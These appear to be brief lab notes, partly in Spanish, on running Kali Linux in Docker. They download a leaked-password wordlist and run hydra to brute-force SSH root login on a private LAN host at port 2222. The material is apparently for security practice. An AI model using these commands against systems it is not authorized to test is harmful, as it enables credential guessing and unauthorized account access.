kalilinux/kali-rolling

Is the main image that you should likely use, tracking the continuously-updated kali-rolling package repository, just like the default images.
https://hub.docker.com/r/kalilinux/kali-rolling
https://www.kali.org/docs/containers/official-kalilinux-docker-images/

Descargamos el archivo Dockerfile, luego

docker build -t kali-hydra .

docker run -it kali-hydra /bin/bash 

curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt > passlist.txt

hydra -s 2222 -l root -P passlist.txt 192.168.0.6 -t 4 -V ssh 
